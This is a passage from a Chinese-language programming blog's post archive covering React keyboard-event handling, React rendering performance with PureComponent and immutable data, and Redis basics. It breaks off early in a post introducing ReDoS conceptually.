of a working draft specification. // FireFox implements `key` but returns `MozPrintableKey` for all // printable characters (normalized to `Unidentified`), ignore it. const key = normalizeKey[nativeEvent.key] || nativeEvent.key; if (key !== 'Unidentified') &#123; return key; &#125; &#125; // Browser does not implement `key`, polyfill as much of it as we can. if (nativeEvent.type === 'keypress') &#123; const charCode = getEventCharCode(nativeEvent); // The enter-key is technically both printable and non-printable and can // thus be captured by `keypress`, no other non-printable key should. return charCode === 13 ? 'Enter' : String.fromCharCode(charCode); &#125; if (nativeEvent.type === 'keydown' || nativeEvent.type === 'keyup') &#123; // While user keyboard layout determines the actual meaning of each // `keyCode` value, almost all function keys have a universal value. return translateToKey[nativeEvent.keyCode] || 'Unidentified'; &#125; return ''; &#125; 這邊一樣是針對瀏覽器的相容性做處理，如果 event 本身就有 key 的話，先做 normalize，把回傳的結果統一成相同的格式。而 FireFox 會把可以印出的字元都設定成 MozPrintableKey，這邊 normalize 成 Unidentified。 如果 normalize 完之後的 key 不是Unidentified的話就回傳，否則再做進一步處理。 而這個進一步處理指的就是 polyfill，如果沒有 key 可以用的話就自己針對 charCode 或是 keyCode 來做處理，回傳相對應的字元或是按鍵名稱。 React 對於這些按鍵相關事件的處理就到這邊差不多了。 原始碼註解寫的很好，可以獲得很多相關資訊，而程式碼很短又不複雜，看起來也很輕鬆，是個很適合入門的切入點。 總結以前用了這麼多次這些按鍵相關事件，我自已卻從來沒想過這些的區別。要嘛就是隨意寫寫然後出 bug，要嘛就是直接從 stackoverflow 上面複製最佳解答，從來都不知道這些的差異。 這次剛好是因為要幫人解惑才去深入研究，沒想到一個簡單的按鍵事件其實也是水很深，可能要真的踩過雷才會更有感觸。最麻煩的其實是瀏覽器的相容性，各個瀏覽器可能都有自己不同的實作，要怎麼處理這些不同的情況才是麻煩的地方。 提到 React 原始碼，大家想到的可能都是 render 的相關機制或是 component 的處理，那些原始碼十分複雜，而且必須要對整體的架構有一定的理解才比較好看懂。 這篇選擇從 keyboard 的事件出發，來看 React 針對這部份的處理。相信程式碼大家都看得懂，也不會覺得特別難，就是想告訴大家若是你想研究其他人的原始碼，有時候不一定要整個專案都看懂，可以先從一些小地方開始下手。 從 utils 這種簡單的 function 開始也行，不一定要從最難的開始挑戰，你都能學到很多東西。","link":"/2019/03/24/react-keypress-keydown/"},{"title":"React 性能優化大挑戰：一次理解 Immutable data 跟 shouldComponentUpdate","text":"前陣子正在重構公司的專案，試了一些東西之後發現自己對於 React 的渲染機制其實不太了解，不太知道 render 什麼時候會被觸發。而後來我發現不只我這樣，其實還有滿多人對這整個機制不太熟悉，因此決定寫這篇來分享自己的心得。 其實不知道怎麼優化倒還好，更慘的事情是你自以為在優化，其實卻在拖慢效能，而根本的原因就是對 React 的整個機制還不夠熟。被「優化」過的 component 反而還變慢了！這個就嚴重了。 因此，這篇文章會涵蓋到下面幾個主題： Component 跟 PureComponent 的差異 shouldComponentUpdate 的作用 React 的渲染機制 為什麼要用 Immutable data structures 為了判別你到底對以上這些理解多少，我們馬上進行幾個小測驗！有些有陷阱，請睜大眼睛看清楚啦！ React 小測驗第一題以下程式碼是個很簡單的網頁，就一個按鈕跟一個叫做Content的元件而已，而按鈕按下去之後會改變App這個 component 的 state。 class Content extends React.Component &#123; render () &#123; console.log('render content!'); return &lt;div>Content&lt;/div> &#125; &#125; class App extends React.Component &#123; handleClick = () => &#123; this.setState(&#123; a: 1 &#125;) &#125; render() &#123; console.log('render App!'); return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>setState&lt;/button> &lt;Content /> &lt;/div> ); &#125; &#125; ReactDOM.render( &lt;App />, document.getElementById('container') ); 請問：當你按下按鈕之後，console 會輸出什麼？ A. 什麼都沒有（App 跟 Content 的 render function 都沒被執行到）B. 只有 render App!（只有 App 的 render function 被執行到）C. render App! 以及 render content!（兩者的 render function 都被執行到） 第二題以下程式碼也很簡單，分成三個元件：App、Table 跟 Row，由 App 傳遞 list 給 Table，Table 再用 map 把每一個 Row 都渲染出來。 class Row extends Component &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;> &lt;td>&#123;item.id&#125;&lt;/td> &lt;/tr> ) &#125; &#125; class Table extends Component &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table> &#123;list.map(item => &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; />)&#125; &lt;/table> ) &#125; &#125; class App extends Component &#123; state = &#123; list: Array(10000).fill(0).map((val, index) => (&#123;id: index&#125;)) &#125; handleClick = () => &#123; this.setState(&#123; otherState: 1 &#125;) &#125; render() &#123; const &#123;list&#125; = this.state; return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>change state!&lt;/button> &lt;Table list=&#123;list&#125; /> &lt;/div> ); &#125; &#125; 而這段程式碼的問題就在於按下按鈕之後，App的 render function 被觸發，然後Table的 render function 也被觸發，所以重新渲染了一次整個列表。 可是呢，我們點擊按鈕之後，list根本沒變，其實是不需要重新渲染的，所以聰明的小明把 Table 從 Component 變成 PureComponent，只要 state 跟 props 沒變就不會重新渲染，變成下面這樣： class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table> &#123;list.map(item => &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; />)&#125; &lt;/table> ) &#125; &#125; // 不知道什麼是 PureComponent 的朋友，可以想成他自己幫你加了下面的 function shouldComponentUpdate (nextProps, nextState) &#123; return !shallowEqual(this.props, nextProps) || !shallowEqual(this.state, nextState) &#125; 把 Table 從 Component 換成 PureComponent 之後，如果我們再做一次同樣的操作，也就是按下change state按鈕改變 App 的 state，這時候會提升效率嗎？ A. 會，在這情況下 PureComponent 會比 Component 有效率B. 不會，兩者差不多C. 不會，在這情況下 Component 會比 PureComponent 有效率 第三題接著讓我來看一個跟上一題很像的例子，只是這次換成按按鈕以後會改變 list： class Row extends Component &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;> &lt;td>&#123;item.id&#125;&lt;/td> &lt;/tr> ) &#125; &#125; class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table> &#123;list.map(item => &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; />)&#125; &lt;/table> ) &#125; &#125; class App extends Component &#123; state = &#123; list: Array(10000).fill(0).map((val, index) => (&#123;id: index&#125;)) &#125; handleClick = () => &#123; this.setState(&#123; list: [...this.state.list, 1234567] // 增加一個元素 &#125;) &#125; render() &#123; const &#123;list&#125; = this.state; return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>change state!&lt;/button> &lt;Table list=&#123;list&#125; /> &lt;/div> ); &#125; &#125; 這時候 Table 的 PureComponent 優化已經沒有用了，因為 list 已經變了，所以會觸發 render function。要繼續優化的話，比較常用的手段是把 Row 變成 PureComponent，這樣就可以確保相同的 Row 不會再次渲染。 class Row extends PureComponent &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;> &lt;td>&#123;item.id&#125;&lt;/td> &lt;/tr> ) &#125; &#125; class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table> &#123;list.map(item => &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; />)&#125; &lt;/table> ) &#125; &#125; 請問：把 Row 從 Component 換成 PureComponent 之後，如果我們再做一次同樣的操作，也就是按下change state按鈕改變 list，這時候會提升效率嗎？ A. 會，在這情況下 PureComponent 會比 Component 有效率B. 不會，兩者差不多C. 不會，在這情況下 Component 會比 PureComponent 有效率 React 的 render 機制在公布答案之前，先幫大家簡單複習一下 React 是如何把你的畫面渲染出來的。 首先，大家都知道你在render這個 function 裡面可以回傳你想渲染的東西，例如說： class Content extends React.Component &#123; render () &#123; return &lt;div>Content&lt;/div> &#125; &#125; 要注意的是這邊 return 的東西不會直接就放到 DOM 上面去，而是會先經過一層 virtual DOM。其實你可以簡單把這個 virtual DOM 想成 JavaScript 的物件，例如說上面 Content render 出來的結果可能是： &#123; tagName: 'div', children: 'Content' &#125; 最後一步則是 React 進行 virtual DOM diff，把上次的跟這次的做比較，並且把變動的部分更新到真的 DOM 上面去。 簡單來說呢，就是在 React Component 以及 DOM 之間新增了一層 virtual DOM，先把你要渲染的東西轉成 virtual DOM，再把需要更新的東西 update 到真的 DOM 上面去。 如此一來，就能夠減少觸碰到真的 DOM 的次數並且提升性能。 舉個例子，假設我們實作一個非常簡單的，按一個按鈕之後就會改變 state 的小範例： class Content extends React.Component &#123; render () &#123; return &lt;div>&#123;this.props.text&#125;&lt;/div> &#125; &#125; class App extends React.Component &#123; state = &#123; text: 'hello' &#125; handleClick = () => &#123; this.setState(&#123; text: 'world' &#125;) &#125; render() &#123; return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>setState&lt;/button> &lt;Content text=&#123;this.state.text&#125; /> &lt;/div> ); &#125; &#125; 在程式剛開始執行時，渲染的順序是這樣的： 呼叫 App 的 render 呼叫 Content 的 render 拿到 virtual DOM 跟上次的 virtual DOM 做比較 把改變的地方應用到真的 DOM 這時候的 virtual DOM 整體應該會長得像這樣： &#123; tagName: 'div', children: [ &#123; tagName: 'button', children: 'setState' &#125;, &#123; tagName: 'div', children: 'hello' &#125; ] &#125; 當你按下按鈕，改變 state 了以後，執行順序都跟剛剛一樣： 呼叫 App 的 render 呼叫 Content 的 render 拿到 virtual DOM 這時候拿到的 virtual DOM 應該會長得像這樣： &#123; tagName: 'div', children: [ &#123; tagName: 'button', children: 'setState' &#125;, &#123; tagName: 'div', children: 'world' // 只有這邊變了 &#125; ] &#125; 而 React 的 virtual DOM diff 演算法，就會發現只有一個地方改變，然後把那邊的文字替換掉，其他部分都不會動到。 其實官方文件把這一段寫得很好： When you use React, at a single point in time you can think of the render() function as creating a tree of React elements. On the next state or props update, that render() function will return a different tree of React elements. React then needs to figure out how to efficiently update the UI to match the most recent tree. 大意就是你可以想像成 render function 會回傳一個 React elements 的 tree，然後 React 會把這次的 tree 跟上次的做比較，並且找出如何有效率地把這差異 update 到 UI 上面去。 所以說呢，如果你要成功更新畫面，你必須經過兩個步驟： render function virtual DOM diff 因此，要優化效能的話你有兩個方向，那就是： 不要觸發 render function 保持 virtual DOM 的一致 我們先從後者開始吧！ 提升 React 效能：保持 virtual DOM 的一致因為有了 virtual DOM 這一層的守護，通常你不必太擔心 React 的效能。 像是我們開頭問答的第一題： class Content extends React.Component &#123; render () &#123; console.log('render content!'); return &lt;div>Content&lt;/div> &#125; &#125; class App extends React.Component &#123; handleClick = () => &#123; this.setState(&#123; a: 1 &#125;) &#125; render() &#123; console.log('render App!'); return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>setState&lt;/button> &lt;Content /> &lt;/div> ); &#125; &#125; ReactDOM.render( &lt;App />, document.getElementById('container') ); 你每次按下按鈕之後，由於 App 的 state 改變了，所以會先觸發 App 的 render function，而因為裡面有回傳&lt;Content /&gt;，所以也會觸發 Content 的 render function。 因此你每按一次按鈕，這兩個 component 的 render function 就會個別被呼叫一次。所以答案是C. render App! 以及 render content!（兩者的 render function 都被執行到） 可是儘管如此，真的 DOM 不會有任何變化。因為在 virtual DOM diff 的時候，React 會發現你這次跟上次的 virtual DOM 長得一模一樣（因為沒有東西改變嘛），就不會對 DOM 做任何操作。 如果能盡量維持 virtual DOM 的結構相似的話，可以減少一些不必要的操作，在這點上其實可以做的優化還很多，可以參考官方文件，裡面寫的很詳細。 提升 React 效能：不要觸發 render function雖然不必太過擔心，但是 virtual DOM diff 也是需要執行時間的。雖然說速度很快，但再快也比不上完全不呼叫來的快，你說是吧。 對於這種「我們已經明確知道不該有變化」的情形，我們連 render 都不該呼叫，因為沒必要嘛，再怎麼呼叫都是一樣的結果。如果 render 沒有被呼叫的話，連 virtual DOM diff 都不需要執行，又提升了一些性能。 你應該有聽過shouldComponentUpdate這個 function，就是來做這件事的。如果你在這個 function 中回傳 false，就不會重新呼叫 render function。 class Content extends React.Component &#123; shouldComponentUpdate () &#123; return false; &#125; render () &#123; console.log('render content!'); return &lt;div>Content&lt;/div> &#125; &#125; class App extends React.Component &#123; handleClick = () => &#123; this.setState(&#123; a: 1 &#125;) &#125; render() &#123; console.log('render App!'); return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>setState&lt;/button> &lt;Content /> &lt;/div> ); &#125; &#125; 加上去之後，你會發現無論你按多次按鈕，Content 的 render function 都不會被觸發。 但是這個東西請小心使用，一個不注意你就會碰到 state 跟 UI 搭不上的情形，例如說 state 明明變成 world，可是 UI 顯示的還是 Hello： class Content extends React.Component &#123; shouldComponentUpdate()&#123; return false; &#125; render () &#123; return &lt;div>&#123;this.props.text&#125;&lt;/div> &#125; &#125; class App extends React.Component &#123; state = &#123; text: 'hello' &#125; handleClick = () => &#123; this.setState(&#123; text: 'world' &#125;) &#125; render() &#123; return ( &lt;div> &lt;button onClick=&#123;this.handleClick&#125;>setState&lt;/button> &lt;Content text=&#123;this.state.text&#125; /> &lt;/div> ); &#125; &#125; 在上面的例子中，按下按鈕之後 state 確實變成world，但是因為 Content 的shouldComponentUpdate永遠都回傳 false，所以不會再次觸發 render，就看不到對應的新的 state 的畫面了。 不過這有點極端，因為通常不會永遠都回傳 false，除非你真的確定這個 component 完全不需要 re-render。 比起這個，有一個更合理的判斷基準是： 如果每一個 props 跟 state 都沒有變，那就回傳 false class Content extends React.Component &#123; shouldComponentUpdate(nextProps, nextState)&#123; return !shallowEqual(this.props, nextProps) || !shallowEqual(this.state, nextState); &#125; render () &#123; return &lt;div>&#123;this.props.text&#125;&lt;/div> &#125; &#125; 假設this.props是： &#123; text: 'hello' &#125; 而nextProps是： &#123; text: 'world' &#125; 那在比較的時候就會發現props.text變了，就可以順理成章的呼叫 render function。還有另外一點是這邊用shallowEqual來比較前後的差異，而不是用deepEqual。 這是出於效能上的考量。別忘了，你要執行這樣的比較也是會吃資源的，尤其是在你的 object 很深很深的時候，要比較的東西可就多了，因此我們會傾向用shallowEqual，只要比較一層即可。 另外，前面有提到PureComponent這個東西，其實就是 React 提供的另外一種元件，差別就是在於它自動幫你加上上面那一段的比較。如果你想看原始碼的話，在這邊： if (type.prototype &amp;&amp; type.prototype.isPureReactComponent) &#123; return ( !shallowEqual(oldProps, newProps) || !shallowEqual(oldState, newState) ); &#125; 講到這邊，就可以來公佈第二題的解答了，答案是：A. 會，在這情況下 PureComponent 會比 Component 有效率，因為繼承了 PureComponent 之後，只要 props 跟 state 沒變，就不會執行 render function，也不會執行 virtual DOM diff，節省了許多開銷。 shallowEqual 與 Immutable data structures你剛開始在學 React 的時候，可能會被告誡說如果要更改資料，不能夠這樣寫： // 不能這樣 const newObject = this.state.obj newObject.id = 2; this.setState(&#123; obj: newObject &#125;) // 也不能這樣 const arr = this.state.arr; arr.push(123); this.setState(&#123; list: arr &#125;) 而是應該要這樣： this.setState(&#123; obj: &#123; ...this.state.obj, id: 2 &#125; &#125;) this.setState(&#123; list: [...this.state.arr, 123] &#125;) 但你知道為什麼嗎？ 這個就跟我們上面講到的東西有關了。如同上面所述，其實使用PureComponent是一件很正常的事情，因為 state 跟 props 如果沒變的話，本來就不該觸發 render function。 而剛剛也提過PureComponent會幫你shallowEqual state 跟 props，決定要不要呼叫 render function。 在這種情況下，如果你用了一開始講的那種寫法，就會產生問題，例如說： const newObject = this.state.obj newObject.id = 2; this.setState(&#123; obj: newObject &#125;) 在上面的程式碼中，其實this.state.obj跟newObject還是指向同一個物件，指向同一塊記憶體，所以當我們在做shallowEqual的時候，就會判斷出這兩個東西是相等的，就不會執行 render function 了。 在這時候，我們就需要 Immutable data，Immutable 翻成中文就是永遠不變的，意思就是：「當一個資料被創建之後，就永遠不會變了」。那如果我需要更改資料的話怎麼辦呢？你就只能創一個新的。 const obj = &#123; id: 1, text: 'hello' &#125; obj.text = 'world' // 這樣不行，因為你改變了 obj 這個物件 // 你必須要像這樣創造一個新的物件 const newObj = &#123; ...obj, text: 'world' &#125; 有了 Immutable 的概念之後，shallowEqual就不會出錯了，因為如果我們有新的資料，就可以保證它是一個新的 object，這也是為什麼我們在用setState的時候總是要產生一個新的物件，而不是直接對現有的做操作。 // 沒有 Immutable 的概念前 const props = &#123; id: 1, list: [1, 2, 3] &#125; const list = props.list; list.push(4) nextProps = &#123; ...props, list &#125; props.list === nextProps.list // true // 有了 Immutable 的概念後 const props = &#123; id: 1, list: [1, 2, 3] &#125; const nextProps = &#123; ...props, list: [...props.list, 4] &#125; props.list === nextProps.list // false 這邊還有一個要注意的地方，那就是 spread operator 只會複製第一層的資料而已，它並不是 deep clone： const test = &#123; a: 1, nest: &#123; title: 'hello' &#125; &#125; const copy = &#123;...test&#125; copy.nest === test.nest // true 所以當你的 state 是比較複雜的結構時，要改變資料就會變得比較麻煩一點，因為你必須要對每一層都做差不多的事情，避免直接去改到你要改的物件： // 沒有 Immutable 的概念前 const props = &#123; title: '123', list: [ &#123; id: 1, name: 'hello' &#125;, &#123; id: 2, name: 'world' &#125; ] &#125; const list = props.list; list[1].name = 'world2'; // 直接改 nextProps = &#123; ...props, list &#125; props.list === nextProps.list // true props.list[1] === nextProps.list[1] // true // 有了 Immutable 的概念後 const props = &#123; title: '123', list: [ &#123; id: 1, name: 'hello' &#125;, &#123; id: 2, name: 'world' &#125; ] &#125; // 要注意這邊只是 shallow copy 而已 // list[0] === props.list[0] => true const list = [...props.list.slice(0, 1)] const data = props.list[1]; const nextProps = &#123; ...props, list: [...list, &#123; ...data, // 再做一次 spread oprator name: 'world2' &#125;] &#125; props.list === nextProps.list // false props.list[0] === nextProps.list[0] // true props.list[1] === nextProps.list[1] // false 若你的 state 結構很多層，那就會變得非常非常難改，這時候你有三個選擇： 避免這麼多層的 state，盡量壓平（可參考normalizr） 找一個會幫你做 Immutable 的 library，例如說 Facebook 的 Immutable.js 直接用 deep clone 把資料全部複製下來，之後你愛怎麼改就怎麼改（不推薦） 註：感謝網友 KanYueh Chen 的指正，讓我補上上面這一段。 PureComponent 的陷阱當我們遵守 Immutable 的規則之後，理所當然的就會想把所有的 Component 都設成 PureComponent，因為 PureComponent 的預設很合理嘛，資料沒變的話就不呼叫 render function，可以節省很多不必要的比較。 那讓我們回頭來看開場小測驗的最後一題： class Row extends PureComponent &#123; render () &#123; const &#123;item, style&#125; = this.props; return ( &lt;tr style=&#123;style&#125;> &lt;td>&#123;item.id&#125;&lt;/td> &lt;/tr> ) &#125; &#125; class Table extends PureComponent &#123; render() &#123; const &#123;list&#125; = this.props; const itemStyle = &#123; color: 'red' &#125; return ( &lt;table> &#123;list.map(item => &lt;Row key=&#123;item.id&#125; item=&#123;item&#125; style=&#123;itemStyle&#125; />)&#125; &lt;/table> ) &#125; &#125; 我們把Row變成了 PureComponent，所以只要 state 跟 props 沒變，就不會 re-render，所以答案應該要是A. 會，在這情況下 PureComponent 會比 Component 有效率？ 錯，如果你把程式碼看更清楚一點，你會發現答案其實是C. 不會，在這情況下 Component 會比 PureComponent 有效率。 你的前提是對的，「只要 state 跟 props 沒變，就不會 re-render，PureComponent 就會比 Component 更有效率」。但其實還有另外一句話也是對的：「如果你的 state 或 props 『永遠都會變』，那 PureComponent 並不會比較快」。 所以這兩種的使用時機差異在於：state 跟 props 到底常常會變還是不會變？ 上述的例子中，陷阱在於itemStyle這個 props，我們每次 render 的時候都創建了一個新的物件，所以對 Row 來說，儘管 props.item 是一樣的，但是 props.style 卻是「每次都不一樣」。 如果你已經知道每次都會不一樣，那 PureComponent 這時候就無用武之地了，而且還更糟。為什麼？因為它幫你做了shallowEqual。 別忘記了，shallowEqual也是需要執行時間的。 已經知道 props 的比較每次都失敗的話，那不如不要比還會來的比較快，所以在這個情形下，Component 會比 PureComponent 有效率，因為不用做shallowEqual。 這就是我開頭提到的需要特別注意的部分。不要以為你把每個 Component 都換成 PureComponent 就天下太平，App 變超快，效能提升好幾倍。不去注意這些細節的話，就有可能把效能越弄越糟。 最後再強調一次，如果你已經預期到某個 component 的 props 或是 state 會「很頻繁變動」，那你根本不用換成 PureComponent，因為你實作之後反而會變得更慢。 總結在研究這些效能相關的問題時，我最推薦這篇：React, Inline Functions, and Performance，解開了很多我心中的疑惑以及帶給我很多新的想法。 例如說文末提到的 PureComponent 有時候反而會變慢，也是從這篇文章看來的，真心推薦大家抽空去看看。 前陣子跟同事一起把一個專案打掉重做，原本的共識是盡量用 PureComponent，直到我看到這篇文並且仔細思考了一下，發現如果你不知道背後的原理，還是不要輕易使用比較好。因此我就提議改成全部用 Component，等我們碰到效能問題要來優化時再慢慢調整。 最後附上一句我很喜歡的話，從React 巢狀 Component 效能優化這篇看來的（這篇也是在講最後提到的 PureComponent 的問題）： 雖然你知道可以優化，但不代表你應該優化。 參考資料：High Performance React: 3 New Tools to Speed Up Your Appsreactjs - Reconciliationreactjs- Optimizing PerformanceReact is Slow, React is Fast: Optimizing React Apps in PracticeEfficient React Components: A Guide to Optimizing React Performance","link":"/2018/01/15/react-performance-immutable-and-scu/"},{"title":"資料庫的好夥伴：Redis","text":"前言Redis 是一個 in-memory 的 key-value database，因此常常被用在需要快取（Cache）一些資料的場合，可以減輕許多後端資料庫的壓力。這篇就來簡單介紹一下 Redis 提供哪些好用的東西，以及可以應用在什麼地方。 常用指令Redis 的官網列出了支援的每一條指令，我們先來看看最簡單的： SET, GETredis&gt; SET mykey &quot;Hello&quot; redis&gt; GET mykey &quot;Hello&quot; 前面有提到說 Redis 是一個 key-value pair 的資料庫，因此最簡單的 SET 就是設定某個 key 的值是多少，要取出來的話就用 GET 就好。 INCR, DECRredis&gt; SET mykey &quot;10&quot; redis&gt; DECR mykey (integer) 9 redis&gt; INCR mykey (integer) 10 顧名思義就是針對某個 key 加一或減一的意思，像是程式語言裡面的mykey++跟mykey--。還有 INCRBY 與 DECRBY，可以指定你要加減的數量是多少。 HSET, HGETredis&gt; HSET mydata name &quot;nick&quot; redis&gt; HSET mydata nickname &quot;nicknick&quot; redis&gt; HGET mydata name &quot;nick&quot; H 就是 Hashmap 的意思，所以你可以存取一個 value 底下的 field，讓你可以更多元的使用，例如說你可以定義 key 的規則是：POST + 文章 id，裡面就可以存這篇文章的讚數、回覆數等等，就不用每一次都去 Database 裡面重新抓取。 SADD, SCARDredis&gt; SADD myset &quot;nick&quot; redis&gt; SADD myset &quot;peter&quot; redis&gt; SADD myset &quot;nick&quot; redis&gt; SCARD myset (integer) 2 SADD 的 S 就是 Set 的意思，這邊的 Set 指的是資料結構學過的那個 Set，裡面不會有重複的內容。 LPUSH, RPUSH, LSET, LRANGEredis&gt; LPUSH mylist &quot;a&quot; redis&gt; LPUSH mylist &quot;b&quot; redis&gt; RPUSH mylist &quot;c&quot; redis&gt; LRANGE mylist 0 -1 1) &quot;b&quot; 2) &quot;a&quot; 3) &quot;c&quot; redis&gt; LSET mylist 0 &quot;d&quot; redis&gt; LRANGE mylist 0 -1 1) &quot;d&quot; 2) &quot;a&quot; 3) &quot;c&quot; 這邊的資料結構是 List，你可以選擇從左邊或是右邊 push 值進去，對應到的指令就是 LPUSH 與 RPUSH，LSET 則是指定某個 index 的 value 是多少。 LRANGE 可以印出指定範圍的值，支援-1這種形式，表示最後一個值。 實際應用Redis 好用的地方就在於速度很快，所以若是開發上碰到一些場合需要速度很快的話，你可以先考慮看看 Redis 是不是能夠幫助到你，以下就舉幾個我實際使用過的例子。 短網址系統其實短網址的原理非常簡單，就是一個 hash 對應到一個網址，hash 是用隨機產生，幾碼或是要有什麼符號可以自己決定，接著就把這組對應關係存到資料庫裡面，別人 query 相應的 key 時，你就 redirect 到相應的網址去就好了。 也因為是這種 key-value 的一對一關係，所以非常適合使用 Redis。如果你不用像是 Redis 這種的 key-value cache，就必須「每一次」都從 Database 去 query。若是資料量小還好，但資料量一變大的時候，時間一定會增加，資料庫的負荷也會增加，因此在資料庫跟邏輯層之間引進一層快取，我認為是很好的選擇。 實作的過程也很簡單， 使用者新增短網址，系統亂數產生 abc123 對應到 http://techbridge.cc 把 key&#x3D;abc123, value&#x3D;http://techbridge.cc 寫進資料庫 同上，但是是儲存在 Redis 當有使用者點擊：abc123 這個網址時，先去 Redis 查有沒有這個 key 有的話，redirect 到對應的網址 沒有的話，只好去資料庫查，查完之後記得寫一份到 Redis 若是你的資料有超級多筆，又不想花很多的錢準備一台記憶體很大的 Redis Server（資料庫是用硬碟儲存，Redis 是存在記憶體，以儲存成本來說，資料庫會便宜許多），你可以使用 Redis 的 Expire 這個功能。 當你在儲存資料的時候，你可以新增一個 Expire time 的參數，當這個時間一到之後，這個 key 就會自動被清除。舉例來說，短網址的 expire 可以設定成 7 天，當某個網址 7 天內都沒有被任何使用者訪問的話，就會自動被刪除。 這樣的好處是你可以減少記憶體的使用量，只保持某些「熱資料」會存在 Redis，其他比較冷門、不常被訪問的數據，就存在 Database，等到被訪問的時候再寫到 Redis 即可。 統計系統其實上面講到的短網址服務，除了縮網址這個功能，還有另一個重點，那就是：統計資料。例如說 Google 短網址，會提供給你：造訪次數、圖表、用什麼裝置等等，這些才是短網址服務的核心。 如果要做這個功能，那你勢必要記錄每一次 Request，或至少要把 Request 的內容（用什麼手機、時間點、IP）記錄下來，才有數據可以給使用者看。 存在 Database，讀取也是每次都從 Database 讀的話，就會造成一些效能上的 issue，例如說每次 refresh 統計頁面，你就必須重新：select conut(*) from short_url where id=&quot;abc123&quot;一次，才能抓到總共有多少人造訪。 還記得我們提過的 INCR 嗎？這不是就派上用場了！可以自己定義 key 的格式，例如說：abc123:visit 代表 abc123 這個短網址的總共造訪次數，接著，只要在每一次的 Request 都執行：INCR abc123:visit，這個 key 裡面就是你要的數字了，以後都從 Redis 讀取就好。 除了這個以外，假設你想要提供「不重複 IP 訪問次數」，前面提到的 Set 就很適合。可以把每一個 Request 的來源 IP 都丟進一個 Set，只要用 SCARD 就可以知道有多少不重複 IP 了，很方便對吧！ 高即時性排名系統我曾經做過一個專案，需求如下： 中午 12 點開放使用者進入網站，並且回答一題問題 回答完後會看到自己的排名（依答題時間排序），照名次獲得獎品 只有前 300 名有獎品，之後都沒有 可以先想一下有哪些地方會需要跟資料庫溝通 進入網站時，要先檢查是否超過 300 名，有的話提示活動結束（select count(*)…） 接著檢查使用者是否已答題過，已答題過的話就顯示排名（select .. where id&#x3D;..） 若沒答過，顯示答題頁面 答題結束之後，顯示使用者名次（insert into .. id&#x3D;..） 由於這個活動只有前 300 名有獎品，預估使用者有 10000 人的話，可能在 10 秒內這個活動就結束了！ 10 秒內你的資料庫必須「同時承受」這麼多個 query，可能會有點吃不消，而且仔細檢視之後，會發現很多地方其實沒有必要用資料庫來做，或者是說，用 Redis 來做會更好！ 例如說，可以這樣規劃： 用一個 key：isOver 儲存活動是否結束 用 account 當做 key，裡面儲存使用者的名次 上面的流程就可以改寫成： 進入網站時，去 Redis 讀取 isOver，查看活動是否結束 檢查使用者是否答題過，看 Redis 的使用者帳號這個 key 有沒有資料 若沒答過題且答完題，寫入資料庫，並且把名次寫入 Redis 若是這個使用者的排名&gt;&#x3D;300，設定 isOver &#x3D; true 原本需要三個對資料庫的操作，現在縮減到只剩下最必要的一個，其他都可以交給 Redis 處理。而且又因為 Redis 是 in-memory 的資料庫，反應速度非常快！再加上我們的 key 並不多（一萬多個 key 而已），用到的記憶體很少。 就這樣，透過 Redis 的幫助，很順利的就可以解決原本資料庫負載太重可能會很慢甚至掛掉的問題。 總結若是下次你有些專案使用者很多，或是需要很快速的返回資訊，但是又怕資料庫撐不住，不妨想想是不是能夠導入 Redis，或其他也是做快取的 service。其實在很多場合，如果快取運用得宜的話，可以減輕很多資料庫的負擔，同時也加快響應的速度。 若是你對 Redis 很有興趣，可以參考 Redis 設計與實現 這個網站。","link":"/2016/09/29/redis-introduction/"},{"title":"正規表達式沒寫好會怎樣？淺談 ReDoS：利用 regexp 的攻擊","text":"Regular expression，中文又翻作「正規表達式」或是「正規表示式」等等（以下簡稱 regexp），主要是用來做字串的配對，寫好一個模式之後，就可以拿來配對到符合規則的文字。 無論是電話號碼、Email 或是身分證字號等等，都可以運用 regexp 來完成初步的格式驗證，確保字串的格式與特定規則相符合。 Regexp 雖然方便，但沒寫好的話有可能導致一些輸入的驗證被繞過，演變成資安問題；而除了這個之外，還有另外一種也會造成問題，就是這篇要來講的 ReDoS，全名為：Regular expression Denial-of-Service，因為正規表達式所引起的阻斷服務攻擊。 在講 ReDoS 之前，先來提一下什麼是 DoS。 舉例來說，假設假設某個網站框架對於 HTTP 請求的解析沒有做好，只要碰到特殊字元就會壞掉，造成伺服器重啟，而這時攻擊者就可以不斷送出這種會讓網站壞掉的請求，造成伺服器一直重啟，這就是一種 DoS。 如果要分更細的話，還可以分成攻擊的是哪一層，例如說是網路層還是應用層等等，這篇講的都是針對應用層的攻擊。 大家平常在網路新聞看到的攻擊，比較多應該是屬於 DDoS，前面多了一個 D，意思是 distributed，分散式的，而且都是針對網路層的攻擊居多。前面我們舉的 DoS 例子可以看出基本上都是網站本身有問題，例如說沒有考慮到特殊狀況等等，才會讓攻擊者可以利用，而 DDoS 比較像是：「不管你有沒有問題，我找一堆人把你塞爆」 以現實生活來舉例，你開了一間小吃店，賣一些常見的東西像是乾麵啦，燙青菜啦等等，因為每次要看客人的菜單點了什麼很花時間，又覺得用手機點餐很沒有人情味，因此訂製了一個「讀菜單機器人」，來幫你看客人的點菜單。 